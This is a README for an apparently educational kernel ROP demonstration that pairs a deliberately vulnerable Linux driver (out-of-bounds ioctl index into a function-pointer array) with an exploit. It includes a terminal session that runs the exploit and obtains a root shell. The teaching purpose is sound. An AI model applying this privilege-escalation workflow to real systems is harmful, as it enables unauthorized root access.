# Linux Kernel ROP demo

This is a vulnerable Linux kernel driver used to demonstrate in-kernel
privilege escalation ROP (Return Oriented Programming) chain in practice. The
article URL for Part 1 is available at
<https://cyseclabs.com/page?n=17012016>.

The driver module is vulnerable to OOB access and allows arbitrary code
execution. An arbitrary offset can be passed from user space via the provided
ioctl(). This offset is then used as the index for the 'ops' array to obtain
the function address to be executed. 
 
* drv.c - vulnerable kernel driver
* trigger.c - user-space application to trigger the OOB access via the provided
  ioctl
* find_offset.py - helper script for finding the correct offset into the "ops" array
* rop_exploit.c - ROP exploit for the "drv.c" kernel driver

The goal is to construct and execute a ROP chain that will satisfy the
following requirements:

* Execute a privilege escalation payload
* Data residing in user space may be referenced (i.e., "fetching" data from
  user space is allowed)
* Instructions residing in user space may not be executed

```
vnik@ubuntu:~$ dmesg | grep addr | grep ops
[  244.142035] addr(ops) = ffffffffa02e9340
vnik@ubuntu:~$ ~/find_offset.py ffffffffa02e9340 ~/gadgets 
offset = 18446744073644231139
gadget = xchg eax, esp ; ret 0x11e8
stack addr = 8108e258

vnik@ubuntu:~/kernel_rop/vulndrv$ gcc rop_exploit.c -O2 -o rop_exploit
vnik@ubuntu:~/kernel_rop/vulndrv$ ./rop_exploit 18446744073644231139 ffffffffa02e9340
array base address = 0xffffffffa02e9340
stack address = 0x8108e258
# id    
uid=0(root) gid=0(root) groups=0(root)
# 
```
